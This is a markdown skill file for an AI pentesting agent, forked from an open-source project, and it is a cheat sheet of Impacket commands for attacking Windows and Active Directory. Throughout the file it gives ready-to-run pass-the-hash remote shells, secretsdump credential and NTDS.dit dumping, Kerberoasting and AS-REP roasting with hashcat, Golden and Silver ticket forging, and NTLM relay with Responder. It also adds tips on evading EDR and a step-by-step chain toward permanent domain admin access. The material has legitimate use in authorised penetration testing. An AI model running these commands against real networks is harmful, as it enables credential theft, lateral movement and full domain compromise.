<!-- aegis-local: forked 2026-05-04 from pikpikcu/airecon@9a21453459d87eefb012ea355c79b593d0d3c0cc (MIT-licensed); attribution preserved, see ATTRIBUTION.md -->

---
name: impacket
description: Impacket toolkit — secretsdump, psexec, wmiexec, smbexec, GetUserSPNs, GetNPUsers, ntlmrelayx, ticketer, and other Windows protocol attack tools in Kali Linux
---

# Impacket Toolkit

Impacket = Python library implementing Windows protocols (SMB, MSRPC, NTLM, Kerberos, LDAP). Contains standalone scripts for most Windows attack scenarios.

**Install:**
```
pip install impacket --break-system-packages
sudo apt-get install -y impacket-scripts
# Verify scripts location:
which secretsdump.py || find /usr -name "secretsdump.py" 2>/dev/null
# If not in PATH: python3 /path/to/impacket/examples/secretsdump.py
```

---

## Remote Code Execution Scripts

### psexec.py — SYSTEM Shell via SMB Named Pipe

    # With password:
    psexec.py domain/username:password@<target>
    psexec.py administrator:password@<target>

    # Pass-the-Hash:
    psexec.py administrator@<target> -hashes :<NTLM_hash>
    psexec.py domain/administrator@<target> -hashes :aad3b435b51404eeaad3b435b51404ee:<NTLM>

    # Run single command:
    psexec.py administrator:password@<target> cmd.exe /c whoami

    # Note: psexec uploads executable to ADMIN$ share → creates service → loud, detected by EDR

### wmiexec.py — Admin Shell via WMI (Stealthier)

    # With password:
    wmiexec.py domain/administrator:password@<target>
    wmiexec.py administrator:password@<target>

    # Pass-the-Hash:
    wmiexec.py -hashes :<NTLM> administrator@<target>

    # Run command only:
    wmiexec.py administrator:password@<target> "ipconfig /all"

    # PowerShell mode:
    wmiexec.py administrator:password@<target> -shell-type powershell

    # Note: no service created, uses WMI → much stealthier than psexec

### smbexec.py — Shell via SMB Service

    # Creates temp service via SCManager — runs as SYSTEM:
    smbexec.py administrator:password@<target>
    smbexec.py -hashes :<NTLM> administrator@<target>

### atexec.py — Shell via Task Scheduler

    # Executes command via Windows Task Scheduler:
    atexec.py administrator:password@<target> "whoami"
    atexec.py -hashes :<NTLM> administrator@<target> "net user"

### dcomexec.py — Shell via DCOM

    # Uses DCOM (MMC, ShellWindows, ShellBrowserWindow):
    dcomexec.py administrator:password@<target>
    dcomexec.py -hashes :<NTLM> administrator@<target>
    dcomexec.py -object MMC20 administrator:password@<target>

---

## Credential Extraction

### secretsdump.py — Dump All Hashes

    # Remote dump (requires admin rights):
    secretsdump.py administrator:password@<target>
    secretsdump.py -hashes :<NTLM> administrator@<target>

    # Domain Controller — dump NTDS.dit (all domain hashes):
    secretsdump.py domain/administrator:password@<dc_ip>
    secretsdump.py -hashes :<NTLM> domain/administrator@<dc_ip>
    secretsdump.py domain/administrator:password@<dc_ip> -just-dc    # Only NTDS, not SAM
    secretsdump.py domain/administrator:password@<dc_ip> -just-dc-ntlm   # NTLM only

    # Local (offline — from downloaded files):
    secretsdump.py LOCAL -sam SAM -system SYSTEM
    secretsdump.py LOCAL -sam SAM -system SYSTEM -security SECURITY
    secretsdump.py LOCAL -ntds NTDS.dit -system SYSTEM

    # Output format: username:RID:LMhash:NThash:::
    # LM often aad3b435b51404eeaad3b435b51404ee (empty) — only NT matters

---

## Kerberos Attack Scripts

### GetUserSPNs.py — Kerberoasting

    # List SPNs:
    GetUserSPNs.py domain.local/username:password -dc-ip <dc_ip>

    # Request TGS tickets (crackable):
    GetUserSPNs.py domain.local/username:password -dc-ip <dc_ip> -request
    GetUserSPNs.py domain.local/username:password -dc-ip <dc_ip> -request -outputfile kerberoast.txt

    # With hash:
    GetUserSPNs.py domain.local/username -hashes :<NTLM> -dc-ip <dc_ip> -request

    # Crack output:
    hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

### GetNPUsers.py — AS-REP Roasting

    # With user list (no credentials needed):
    GetNPUsers.py domain.local/ -usersfile users.txt -format hashcat -no-pass -dc-ip <dc_ip>

    # With credentials (enumerate vulnerable accounts):
    GetNPUsers.py domain.local/username:password -request -format hashcat -dc-ip <dc_ip>

    # Crack:
    hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt

### getTGT.py — Get TGT Ticket

    # From password:
    getTGT.py domain.local/username:password -dc-ip <dc_ip>

    # From NTLM hash (Overpass-the-Hash):
    getTGT.py domain.local/username -hashes :<NTLM> -dc-ip <dc_ip>

    # From AES key:
    getTGT.py domain.local/username -aesKey <AES256_key> -dc-ip <dc_ip>

    # Output: username.ccache
    export KRB5CCNAME=username.ccache
    # Use with any -k -no-pass impacket tool

### ticketer.py — Golden/Silver Ticket

    # Golden Ticket:
    ticketer.py -nthash <krbtgt_NTLM> -domain-sid S-1-5-21-xxx -domain domain.local Administrator
    # Silver Ticket (specific service):
    ticketer.py -nthash <service_NTLM> -domain-sid S-1-5-21-xxx -domain domain.local \
      -spn cifs/<server>.domain.local Administrator

    # Use:
    export KRB5CCNAME=Administrator.ccache
    psexec.py -k -no-pass Administrator@<target>

---

## NTLM Relay Attack

### ntlmrelayx.py — Relay NTLM Auth to Other Systems

    # Relay to SMB (dump SAM automatically):
    ntlmrelayx.py -tf relay_targets.txt -smb2support

    # With command execution:
    ntlmrelayx.py -tf relay_targets.txt -smb2support -c "powershell -enc <b64>"

    # Relay to HTTP (LDAP):
    ntlmrelayx.py -tf relay_targets.txt -smb2support --delegate-access  # AD CS attack

    # Combine with Responder (capture NTLM):
    # Edit /etc/responder/Responder.conf → SMB=Off, HTTP=Off
    sudo responder -I eth0 -dwP &
    ntlmrelayx.py -tf targets.txt -smb2support -i  # -i = interactive shell

---

## SMB Enumeration

### lookupsid.py — SID Enumeration

    # Enumerate users via SID brute force (null session):
    lookupsid.py domain.local/guest@<target>
    lookupsid.py anonymous@<target>

### rpcdump.py — RPC Endpoints

    rpcdump.py <target>
    rpcdump.py domain/username:password@<target>

### samrdump.py — SAMR Protocol Enumeration

    samrdump.py <target>
    samrdump.py domain/username:password@<target>
    # Lists users, groups, shares

---

## LDAP Queries

### ldapdomaindump.py — Full LDAP Dump

    # pip install ldapdomaindump --break-system-packages
    ldapdomaindump -u 'domain\username' -p 'password' <dc_ip> -o output/ldap/
    # Creates: domain_users.json, domain_computers.json, domain_groups.json, domain_policy.json

---

## Pro Tips

1. `secretsdump.py` on any admin box = instant credential harvest; on DC = entire domain
2. `wmiexec.py` > `psexec.py` for stealth — no service creation, harder to detect
3. Chain: `GetNPUsers.py` (no creds) → crack → `GetUserSPNs.py` → crack service accounts → admin
4. `lookupsid.py guest@target` = null session user enumeration on many AD environments
5. `ntlmrelayx.py -i` = interactive SMB shell on relay target without any reverse payload
6. Always try `-hashes :<NTLM>` — most impacket scripts support pass-the-hash natively

## Summary

Impacket priority order:
1. `secretsdump.py` (admin creds/hash) → all credentials
2. `GetNPUsers.py` (user list, no creds) → AS-REP roast → crack → initial foothold
3. `GetUserSPNs.py` (any domain user) → Kerberoast → crack → service account
4. `wmiexec.py` (stealthy) or `psexec.py` (SYSTEM) → remote execution
5. `ntlmrelayx.py` → relay captured NTLM auth to high-value targets
6. `ticketer.py` (krbtgt hash) → Golden Ticket → permanent DA access
